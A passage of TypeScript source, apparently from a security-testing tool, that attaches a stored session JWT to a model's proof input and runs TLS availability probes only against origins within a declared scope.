  const rec = input as Record<string, unknown>;
  if (typeof rec.jwt === "string" && rec.jwt) return input;   // model supplied one already (unusual)
  const ref = rec.jwt_from_session ?? rec.auth_from_session ?? rec.session;
  if (typeof ref !== "string" || !ref.trim()) return input;
  const token = runner.sessionTokenForProof(ref.trim());
  if (!token) return input;
  return { ...rec, jwt: token };
}

async function resolveDerivedInput(
  expression: string, derivedInput: unknown, scopeOrigins: readonly string[], prober: TlsProber,
): Promise<unknown> {
  if (expression.trim() !== "tls_unavailable") return derivedInput;
  if (!derivedInput || typeof derivedInput !== "object" || Array.isArray(derivedInput)) return derivedInput;
  const origins = (derivedInput as { origins?: unknown }).origins;
  if (!Array.isArray(origins) || origins.length === 0 || !origins.every((o) => typeof o === "string")) {
    return derivedInput;
  }
  const results = new Map<string, boolean>();
  for (const origin of origins as string[]) {
    if (!isInScopeHost(origin, scopeOrigins)) continue;
    results.set(origin, await prober(origin));
  }
  return {
    ...(derivedInput as Record<string, unknown>),
    origins,
    prober: (origin: string) => results.get(origin) ?? true,
  };
}
